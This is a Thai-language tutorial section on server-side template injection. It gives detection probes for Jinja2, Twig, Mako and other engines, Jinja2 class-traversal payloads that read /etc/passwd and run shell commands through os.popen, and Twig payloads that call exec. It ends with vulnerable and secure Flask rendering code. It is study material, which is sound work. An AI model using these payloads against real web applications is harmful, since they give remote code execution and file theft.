# Part 040: Server-Side Template Injection (SSTI)

## ภาพรวม

SSTI เป็น vulnerability ที่เกิดจากการ inject code เข้าไปใน template engine มักนำไปสู่ Remote Code Execution

**ขั้นตอนที่ 606-620**

---

## 606. Template Engines

```
Jinja2 (Python/Flask): {{ 7*7 }} = 49
Mako (Python): ${7*7} = 49
Twig (PHP): {{7*7}} = 49
Freemarker (Java): ${7*7} = 49
Smartly (PHP): {$smarty.version}
Handlebars (Node.js): {{7*7}} = 49
```

---

## 607. Detection

```
ทดสอบ: {{7*7}} = 49 → SSTI!

ผลลัพธ์:
49  → Jinja2, Twig, Freemarker
7*7 → Not a template engine, or escaped
7   → Mako (ใช้ ${} syntax)
```

---

## 608. Jinja2 SSTI (Flask)

```
ประเมินผล Python expressions:
{{ 7*7 }}
{{ config }}
{{ config.items() }}

ดึงโครงสร้าง Python:
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[2].__subclasses__() }}

RCE:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# เช็คมากขึ้น:
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

---

## 609. ป้องกัน SSTI

```python
from jinja2 import Environment, select_autoescape

# VULNERABLE
template_str = f"Hello {user_input}!"  # BAD!
env = Environment()
env.from_string(template_str).render()

# SECURE - ใช้ render ด้วย variable แทน
template = env.from_string("Hello {{ name }}!")
template.render(name=user_input)  # SAFE!

# SECURE - sandboxed environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment(autoescape=True)
template = env.from_string("Hello {{ name }}!")
template.render(name=user_input)
```

---

## 610. Twig SSTI (PHP)

```
ตรวจสอบ: {{7*7}} = 49

ดึง config:
{{_self.env.getRuntime('Symfony\\Component\\Form\\FormRenderer')}}

{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}
```

---

## สรุป

SSTI:
- **ไม่ใช่ SQL injection** แต่แผนภัยเหมือนกัน
- **{{7*7}}** - detection payload
- **Jinja2** - Python class traversal
- **Prevention** - template + variable separation

---

*Part 040 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
